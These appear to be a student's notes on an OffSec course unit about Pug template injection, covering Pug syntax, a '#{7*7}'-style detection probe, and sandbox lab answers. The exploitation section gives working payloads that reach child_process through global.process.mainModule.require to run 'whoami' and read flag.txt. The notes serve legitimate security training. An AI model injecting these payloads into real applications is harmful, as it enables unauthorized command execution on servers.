

This Learning Unit covers the following Learning Objectives:

1. Understand the basic syntax of Pug
2. Understand how to discover a Pug template in a black box scenario
3. Understand how to reach RCE with a Pug Template

-----------

#### Pug Discovery
_Pug_, previously known as _Jade_,[1](https://portal.offsec.com/courses/web-200-28380/learning/server-side-template-injection-discovery-and-exploitation-30963/pug-discovery-and-exploitation-31315/pug-discovery-30983#fn-local_id_174-1) is a JavaScript templating engine.

While Pug is most commonly used for server-side templating, it also supports compiling templates for client-side rendering. Pug is commonly integrated with the _Express_[2](https://portal.offsec.com/courses/web-200-28380/learning/server-side-template-injection-discovery-and-exploitation-30963/pug-discovery-and-exploitation-31315/pug-discovery-30983#fn-local_id_174-2) framework in a _NodeJS_[3](https://portal.offsec.com/courses/web-200-28380/learning/server-side-template-injection-discovery-and-exploitation-30963/pug-discovery-and-exploitation-31315/pug-discovery-30983#fn-local_id_174-3) application.

The syntax for Pug templates is significantly different than the other templating engines we have reviewed so far. This is because Pug is specially-designed to generate HTML files. Even its documentation for plain text[4](https://portal.offsec.com/courses/web-200-28380/learning/server-side-template-injection-discovery-and-exploitation-30963/pug-discovery-and-exploitation-31315/pug-discovery-30983#fn-local_id_174-4) discusses how to add plain text into an HTML document.

Because of its design, Pug has syntax for specifying an HTML tag and tag attributes. Its method for defining a statement and expression is also different than other templating engines. Let's review a template and break down each section. We can find it in the sandbox by visiting `/pug`.

```js
01   h1 Hello, #{name}
02   input(type='hidden' name='admin' value='true')
03 
04   if showSecret
05     - secret = ['❤️','😍', '🤟']
06     p The secrets are: 
07     each val in secret
08       p #{val}
09   else
10    p No secret for you!
```

This template is executed in conjunction with a couple of variables.
![[Pasted image 20241024215815.png]]
The template begins with an expression to display an HTML H1 tag that greets the user with their name.
```js
01   h1 Hello, #{name}
...
```

We'll notice an expression in this first line. The default delimiter in Pug is a number sign and an open curly bracket (#{), with the closing delimiter being only a closed curly bracket (}). It's also interesting to us that Pug requires the first word to be the HTML tag that will wrap the following data, as shown in Listing 24.

The content after the initial h1 will become wrapped in `<h1>` tags. While h1 is a common HTML tag, custom values could be found here, too. For example, if we started the line with _foo_, the contents after the first word would be wrapped in a tag named "foo".

HTML tags often require additional attributes. Pug allows us to pass attributes in parentheses after the tag declaration, as shown in the second line of the template.

```js
02   input(type='hidden' name='admin' value='true')
```

We'll observe in Listing 25 that this HTML tag contains three attributes: type, name, and value. Since the type is "hidden", this element won't display when the HTML is rendered.

Following the input tag, we find an _if_ statement.

```js
04   if showSecret
...
09   else
10     p No secret for you!
```

The _showSecret_ variable is set to "true" in this template, meaning the first part of the _if_ statement will be rendered. One interesting component of Pug is that keywords like "if" and "else" have specific meanings and are not treated as HTML tags. Instead, they are treated as statements. This is different than the other templating engines we have reviewed because there is no special delimiter that treats statements and expressions differently.

Pug can also execute JavaScript code directly, a feature we'll find to be very useful later. We can observe this within the first line of the _if_ statement.

```js
05     - secret = ['❤️','😍', '🤟']
```
In Listing 27, we are setting a _secret_ variable to an Array. Using the dash character (-) in front of Pug indicates that the code should be executed by the JavaScript engine and the output should not be displayed (unbuffered code[5](https://portal.offsec.com/courses/web-200-28380/learning/server-side-template-injection-discovery-and-exploitation-30963/pug-discovery-and-exploitation-31315/pug-discovery-30983#fn-local_id_63-5)).

Pug also supports buffered code, which displays the output of the command. We can instruct Pug to run as buffered code by using an equal sign instead of the dash.

```js
= secret = ['❤️','😍', '🤟']
```

Let's replace the dash with an equal sign in the template. We should observe the array displayed on the page.
![[Pasted image 20241024220806.png]]
Finally, we find a loop in the Pug template that iterates through the _secret_ array and displays each element on the page.
```js
07     each val in secret
08       p #{val}
```
As with the _if_ statement, the _each_ keyword has a special meaning and its contents will not be used to create an HTML tag. Instead, each value within the _secret_ array will be shown in an HTML _p_ tag.

Now that we better understand how Pug works, let's think about how we could discover it on a target. Because Pug uses a format that's different from most popular templating engines, we can check the first word of a target template's new line to determine if it wraps its contents in HTML tags. If so, we're likely to be dealing with Pug.

We'll use the payload `#{"7"*7} `for a couple of reasons. First, if the output is "49", we'll know that we are most likely dealing with a language that is not strictly handling variables, like JavaScript or PHP. Next, since Pug expects the first word of a line to be a tag, it will encompass this in < and > signs. Let's use this payload in the sandbox and review the output.

![[Pasted image 20241024221052.png]]
As shown in the image, "<49>" is displayed, indicating that this is most likely a Pug templating engine.

Go to http://template-sandbox/pug for the following exercise.

##### Labs
`OS{VanGogh}`
![[Pasted image 20241024221757.png]]

```js
h1 Hello, #{SECRET_STRING}
input(type='hidden' name='admin' value='true')

if SECRET_STRING
  - secret = ['❤️','😍', '🤟']
  p The secrets are: 
  each val in secret
    p #{val}
else
  p No secret for you!
```
![[Pasted image 20241024221840.png]]

----------
#### 11.4.2. Pug - Exploitation
The payload to execute code via Pug is, in some ways, more straightforward than others, since Pug allows for more direct access to the underlying JavaScript programming language. Because Pug is rendering on the server-side, we know we're typically working with NodeJS.

Searching for "NodeJS execute System Command", we'll find the documentation for the _child_process.spawnSync_ command, which executes system commands on the target.[1](https://portal.offsec.com/courses/web-200-28380/learning/server-side-template-injection-discovery-and-exploitation-30963/pug-discovery-and-exploitation-31315/pug-discovery-30983#fn-local_id_71-1) Once the command executes, we can access _stdout_ to read the output of the command. The _child_process_ module isn't accessible by default. Instead, we will need to use the `require` function to import it. Let's find out if we have access to the `require` function first. We'll use the buffered code feature of Pug to read the output of `require` if it exists.

![[Pasted image 20241024222135.png]]

Unfortunately, the output was empty. This most likely means we don't have direct access to _require_. However, we can try to access _require_ from the global object. While we don't need to develop a deep understanding of why this global object exists, we should know that in NodeJS, _global_ is similar to the browser's _window_ object. If we indeed have access to the _global_ object, we can access _require_ by typing `global.process.mainModule.require`.

![[Pasted image 20241024222307.png]]

This time, the source code of the _require_ function is returned! We can create a new variable named _require_ and set its value to the _global.process.mainModule.require_ function. We can now attempt to import "child_process" again. We'll set the _require_ variable in an unbuffered code statement since we don't need the output.

```js
- var require = global.process.mainModule.require
= require('child_process')
```

We'll run the payload in Listing 30 within the sandbox.

![[Pasted image 20241024222718.png]]

While the `"[object Object]"` output might not seem interesting, this confirms we have imported the `child_process` object. All that's left to execute commands on the target is to run a command using `spawnSync` and access the output with stdout.

```js
- var require = global.process.mainModule.require
= require('child_process').spawnSync('whoami').stdout
```

Again, we'll run the payload in Listing 31 in the sandbox.

![[Pasted image 20241024222828.png]]

Nice! We're able to inject into a Pug template to execute commands on the system.

Go to `http://template-sandbox/pug` for the following exercise.

(Nodejs, 2021), [https://nodejs.org/docs/latest/api/child_process.html#child_process_child_process_spawnsync_command_args_options](https://nodejs.org/docs/latest/api/child_process.html#child_process_child_process_spawnsync_command_args_options) [↩︎](https://portal.offsec.com/courses/web-200-28380/learning/server-side-template-injection-discovery-and-exploitation-30963/pug-discovery-and-exploitation-31315/pug-exploitation-30979#fnref-local_id_71-1)


##### Labs
![[Pasted image 20241024223826.png]]
```js
- var require = global.process.mainModule.require
- var flag = require('child_process').spawnSync('cat', ['flag.txt']).stdout.toString()
= flag
```
Explanation:
Googling Node JS shows ways to format this as well.
![[Pasted image 20241024223640.png]]
flag
![[Pasted image 20241024223920.png]]